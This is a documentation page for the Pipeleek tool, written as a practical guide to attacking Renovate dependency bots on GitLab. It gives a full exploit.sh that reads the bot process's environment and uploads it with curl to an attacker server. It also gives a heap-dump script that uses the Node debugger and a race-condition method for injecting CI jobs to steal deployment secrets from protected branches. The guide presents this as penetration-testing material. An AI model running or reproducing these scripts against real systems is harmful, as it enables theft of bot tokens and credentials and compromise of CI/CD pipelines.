---
title: Attacking Renovate Bots - A Practical Guide
description: Learn how to discover and exploit common misconfigurations in Renovate bot setups, including autodiscovery exploits and privilege escalation.
keywords:
  - renovate bot security
  - CI/CD security
  - pipeline security
  - privilege escalation
---

# Attacking Renovate Bots: A Practical Guide

This guide explains how to use Pipeleek to discover and exploit common misconfigurations in Renovate bot setups. For more background and technical details, see the full [blog post](https://blog.compass-security.com/2025/05/renovate-keeping-your-updates-secure/).

There are two key points to understand:

**Code Execution by Renovated Repositories**

> Every project renovated by the same bot must be considered equally trusted and exposed to the same attack level. If one project is compromised, all others processed by that bot can be affected. Code execution by the renovated repository in the bot context is assumed in Renovate's threat model.

**GitLab Invite Auto-Acceptance**

> GitLab project invites are auto-accepted. You can invite any bot directly to your repository. If it is then renovated by the invited bot, you can compromise the bot user.

Note: The commands are available for GitHub as well, however exploitation might differ as GitHub employs more security barriers e.g. invites are not auto-accepted.

## 1. Enumerate Renovate Bot Usage

Use the `enum` command to scan your GitLab instance for Renovate bot jobs and configuration files. This is useful for:

- Identify Renovate configurations
- Finding projects with vulnerable Renovate bot configurations
- Collecting config files for further analysis

For example, we enumerated Renovate configs found on GitLab.com. One project was found that enables Renovate's autodiscovery of projects and does **not** set any autodiscovery filters.

```bash
pipeleek gl renovate enum -u https://gitlab.com -t glpat-[redacted] --dump
2025-09-30T07:11:06Z info Fetching projects
2025-09-30T07:11:12Z info Renovate configuration autodiscoveryBypassExample=pipeleek-abc/project autodiscoveryFilterBypass=unfiltered-autodiscovery autodiscoveryNamespaceStatus=not-found autodiscoveryRegistration=unconfirmed hasAutodiscovery=true isSelfHosted=true pipelines=enabled url=https://gitlab.com/test-group/renovate-bot
2025-09-30T07:11:16Z info Fetched all projects
2025-09-30T07:11:16Z info Done, Bye Bye 🏳️‍🌈🔥
```

Each project summary uses the message `Renovate configuration` with `hasAutodiscovery`, `pipelines`, `isSelfHosted`, and `url`. `isSelfHosted=true` means a self-hosted-only Renovate option was found in the combined configuration files or CI configuration; it does not mean a dedicated self-hosted config file exists. When present, autodiscovery filter details and bypass/review findings are included on the same line.

This makes the bot susceptible to autodiscovery exploits, since it will renovate any repository it can access.

Even when autodiscovery filters are enabled, weak or poorly written filter regexes can still allow attackers to bypass them and exploit the bot.

Pipeleek analyzes `autodiscoverFilter` patterns and reports vulnerable scopes through `autodiscoveryFilterBypass`. Values name the issue directly: `negation-only-filter`, `unrestricted-wildcard`, `unanchored-regex`, `path-boundary-bypass`, or `unfiltered-autodiscovery`. Review findings are reported through `autodiscoveryFilterReview`, such as `unsupported-extglob` or `unresolved-variable`.

For a filter bypass, `autodiscoveryBypassExample` is a candidate path accepted by the complete filter outside the identified root namespaces. For unfiltered autodiscovery, the example uses `pipeleek-<three random lowercase letters>/project`. `autodiscoveryNamespaceStatus` reports whether GitLab returned `exists`, `not-found`, or `unknown` for the candidate root. `autodiscoveryRegistration=unconfirmed` means the scan did not attempt registration; a nonexistent namespace is not proof that registration is permitted. Candidate matches do not establish that the bot can access or process the project, and no match does not prove a filter is safe.
Quick examples (filter value -> example bypass path):

- `negation-only-filter`: `["!/acme-org/private/.*"]` -> `attacker/any-repo`
- `unrestricted-wildcard`: `*` -> `attacker/any-repo`
- `unanchored-regex`: `/acme-org\/infra/` -> `evil-acme-org/infra-test`
- `path-boundary-bypass`: `/^acme-org/` -> `acme-org-evil/x`
- `path-boundary-bypass`: `/^acme-org[1-9]/` -> `acme-org1/project`
- `unfiltered-autodiscovery`: autodiscovery enabled with no filter -> any token-visible project

Flat extglobs using `@`, `+`, `?`, or `*` are analyzed. Nested or other unsupported extglobs produce an `unsupported-extglob` review finding rather than being treated as safe.

Candidate generation tests common namespace mutations, including each single-letter and single-digit suffix. It is bounded and does not cover every possible multi-character pattern.

GitLab project path variables (`CI_PROJECT_ROOT_NAMESPACE`, `CI_PROJECT_NAMESPACE`, and `CI_PROJECT_PATH`) are resolved from the current project before analysis. If a variable cannot be resolved, Pipeleek reports an `unresolved-variable` review finding.

`autodiscoverNamespaces` is recognized as a scope but is not analyzed as an `autodiscoverFilter` pattern. When topics are the only scope, Pipeleek reports `autodiscoveryScopeReview=topic-only-autodiscovery`; topic values are not analyzed as path patterns.

When a literal `autodiscoverNamespaces` restriction is present, GitLab limits discovery to those namespaces, so outside-namespace filter candidates are not reported as bypasses. Unresolved or unsupported namespace values produce a `namespace-scope-unresolved` review finding.

Scope settings are extracted from each discovered configuration separately. When the same setting appears in several sources, the scanner prefers CI command-line flags, then CI environment variables, then `config.js`, the primary configuration file, and other discovered configuration files. This is a best-effort static interpretation; verify the bot's effective runtime configuration when settings conflict.

### Identify Renovate Bots Directly

Use the `bots` command to identify Renovate bot users directly, even if the target instance has little or no visible Renovate configuration.

```bash
pipeleek gl renovate bots -u https://gitlab.com -t glpat-[redacted]
```

This command is useful when `pipeleek gl renovate enum` returns no results, for example when configuration files were deleted or are not accessible to your token.

If no Renovate configs are found, blind exploitation might still work: identify a likely Renovate bot user, invite it to your repository, and hope it is misconfigured and processes your project.

## 2. Exploit Autodiscovery with a Malicious Project

The Renovate bot from the example above is configured to autodiscover new projects and does not apply any, or only weak, bypassable filters. You can create a repository with a malicious script that gets executed by the bot.

The following command creates a repository that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.

```bash
pipeleek gl renovate autodiscovery -u https://gitlab.com -t glpat-[redacted] -v
2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleek-renovate-autodiscovery-poc
2025-09-30T07:19:35Z debug Created file fileName=renovate.json
2025-09-30T07:19:35Z debug Created file fileName=pom.xml
2025-09-30T07:19:36Z debug Created file fileName=mvnw
2025-09-30T07:19:36Z debug Created file fileName=.mvn/wrapper/maven-wrapper.properties
2025-09-30T07:19:37Z debug Created file fileName=exploit.sh
2025-09-30T07:19:37Z info This exploit works by using an outdated Maven wrapper version that triggers Renovate to run './mvnw wrapper:wrapper'
2025-09-30T07:19:37Z info When Renovate updates the wrapper, it executes our malicious mvnw script which runs exploit.sh
2025-09-30T07:19:37Z info Make sure to update the exploit.sh script with the actual exploit code
2025-09-30T07:19:37Z info Then wait until the created project is renovated by the invited Renovate Bot user
```

First, set up the `exploit.sh` script according to your needs. The goal is to read the Renovate process environment variables and exfiltrate them to your attacker server.

```bash
#!/bin/bash
UPLOAD_URL="https://[attacker-ip]:8080/upload"

if [ -z "$UPLOAD_URL" ]; then
    echo "Upload URL is empty"
    exit 1
fi

# 1. Get renovate PID
RPID=$(ps -eo pid,cmd | grep -i 'renovate' | awk '{print $1}' | head -n 1)
echo "[+] Renovate PID: $RPID"

# 2. Upload /proc/<PID>/environ to GoShs server
ENV_FILE="renovate_environ_${RPID}.txt"
if [ -r "/proc/$RPID/environ" ]; then
    tr '\0' '\n' < /proc/$RPID/environ > "$ENV_FILE"
    echo "[+] Uploading $ENV_FILE to GoShs server..."
    curl -k -sSf -X POST -F "files=@$ENV_FILE" "$UPLOAD_URL"
else
    echo "[-] Cannot read /proc/$RPID/environ"
fi
```

On your attacker server, start a [GoShs](https://github.com/patrickhener/goshs) server to accept the environment files from the Renovate process.

```bash
goshs --ssl --self-signed --upload-only --invisible --no-delete --port 8080
INFO   [2025-09-30 09:31:29] You are running the newest version (v1.1.1) of goshs
```

Next, identify the bot user and invite it to your repository. By looking at the Renovate bot configuration, you can identify the renovated repos and check the username of the bot user in the merge requests created by that bot.

Such a merge request can look like this. Below the title, you see the bot's username `renovate_runner`.

![Renovate MR](./renovate_mr.png)

Invite that user to your repository with `developer` access. Now, wait until the bot is triggered next. After it has run, you can find the environment file on your GoShs server.

In that file, extract all sensitive environment variables and use them for lateral movement. Most interesting is probably the `RENOVATE_TOKEN`, as it might contain a GitLab PAT. You can then enumerate the access of that PAT using Pipeleek's features.

> After receiving a merge request from the Renovate bot, you must fully delete both the branch and the merge request. This ensures the bot will recreate them, allowing your script to run again. Otherwise, the script will not be executed a second time. Ensure to revert the commits as well if they were merged.

### Dump Renovate Process Heap

In some cases the Renovate bot configuration file might have been [deleted](https://docs.renovatebot.com/self-hosted-configuration/#deleteconfigfile) and you want to recover it. The following script can be used to dump the heap for further analysis.

```bash
#!/bin/bash

PID=$(ps -eo pid,args | grep -E '/node\b.*renovate' | grep -v grep | awk '{print $1}' | head -1)
echo "Renovate PID: $PID"

kill -USR1 "$PID"
sleep 2

WS_URL=$(/usr/local/renovate/node -e "
  const http = require('http');
  http.get('http://127.0.0.1:9229/json', r => {
    let d = '';
    r.on('data', c => d += c);
    r.on('end', () => console.log(JSON.parse(d)[0].webSocketDebuggerUrl));
  });
" 2>/dev/null)

echo "WS: $WS_URL"

/usr/local/renovate/node -e "
  const ws = new WebSocket('$WS_URL');
  const chunks = [];
  const t = setTimeout(() => process.exit(1), 120000);

  ws.addEventListener('open', () => {
    ws.send(JSON.stringify({
      id: 1,
      method: 'HeapProfiler.takeHeapSnapshot',
      params: { reportProgress: false }
    }));
  });

  ws.addEventListener('message', e => {
    const m = JSON.parse(e.data);
    if (m.method === 'HeapProfiler.addHeapSnapshotChunk') {
      chunks.push(m.params.chunk);
    }
    if (m.id === 1) {
      clearTimeout(t);
      require('fs').writeFileSync('/tmp/heap.json', chunks.join(''));
      ws.close();
    }
  });
" 2>/dev/null

echo "Saved /tmp/heap.json ($(wc -c < /tmp/heap.json) bytes)"
```

## 3. Privilege Escalation via Renovate Bot Branches

In this scenario, assume you already have access to a repository, but only with developer permissions. You want to gain access to the CI/CD variables configured for deployments. However, you cannot directly access these, as they are only provided to pipeline runs on protected branches like the main branch.

Fortunately, the project is using Renovate and the bot is configured to auto-merge after tests pass in the merge request created by the bot. Thus, the bot has maintainer access to the repository.

Your goal is to abuse the Renovate bot's access level to merge a malicious `gitlab-ci.yml` file into the main branch, effectively bypassing a review by other project maintainers. On the main branch, you can then steal the exposed environment variables used for deployments.

Using Pipeleek, you can monitor your repository for new Renovate branches. When a new one is detected, Pipeleek tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (adding new changes to the Renovate branch before the bot activates auto-merge), this might take a few attempts.

```bash
pipeleek gl renovate privesc -u https://gitlab.com -t glpat-[redacted] --repo company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
2025-09-30T07:56:57Z debug Verbose log output enabled
2025-09-30T07:56:57Z info Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch
2025-09-30T07:56:58Z debug Testing push access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
2025-09-30T07:56:58Z debug Testing merge access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
2025-09-30T07:56:58Z info Default branch is protected and you do not have direct access, proceeding with exploit branch=main currentAccessLevel=30
2025-09-30T07:56:58Z info Monitoring for new Renovate Bot branches to exploit
2025-09-30T07:56:58Z debug Checking for new branches created by Renovate Bot
2025-09-30T07:56:58Z debug Storing original branches for comparison
2025-09-30T07:56:58Z debug Checking for new branches created by Renovate Bot
2025-09-30T07:57:30Z debug Checking for new branches created by Renovate Bot
2025-09-30T07:57:30Z info Checking if new branch matches Renovate Bot regex branch=renovate/update-lib1
2025-09-30T07:57:30Z info Identified Renovate Bot branch, starting exploit process branch=renovate/update-lib1
2025-09-30T07:57:30Z info Fetching .gitlab-ci.yml file from Renovate branch branch=renovate/update-lib1
2025-09-30T07:57:30Z info Modifying .gitlab-ci.yml file in Renovate branch branch=renovate/update-lib1
2025-09-30T07:57:31Z info Updated remote .gitlab-ci.yml file in Renovate branch branch=renovate/update-lib1 fileinfo={"branch":"renovate/update-lib1","file_path":".gitlab-ci.yml"}
2025-09-30T07:57:31Z info CI/CD configuration updated, check yourself if we won the race! branch=renovate/update-lib1
2025-09-30T07:57:31Z info If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the CI/CD pipeline that runs on the default branch
```

Manually check if the merge request has been set to auto-merge, and see if your changes land in the main branch. If they do, you have successfully injected a CI/CD job into the protected branch. From there, leak all the credentials and continue your attack path.
